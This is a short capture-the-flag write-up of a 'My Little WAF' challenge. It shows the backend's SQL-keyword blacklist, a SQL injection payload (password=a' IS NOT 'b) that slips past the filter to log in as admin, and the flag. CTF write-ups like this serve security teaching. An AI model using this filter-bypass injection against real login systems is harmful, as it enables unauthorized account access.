# My Little WAF

## Description
Can you break my little WAF?

### Author
Zain Ali Raza

## Solution

![image](https://github.com/0xZainRaza/DevDay24-CTF-Writeups/assets/154006182/ccc9c656-b242-40c5-9e88-d3cc0650c9fe)

There is a Blacklist used at the backend 

blacklist = ["or", "and", "true", "false", "union", "like", "=", ">", "<", ";", "--", "/*", "*/"]

Inorder to Bypass it our payload will be 
```bash
username=admin&password=a' IS NOT 'b
```

![image](https://github.com/0xZainRaza/DevDay24-CTF-Writeups/assets/154006182/7fff0da1-0942-4fe4-b94f-16cae038aefb)


**Flag:**
> DD24{bypassing_WAF_1s_n0t_4lw4ys_3asy}
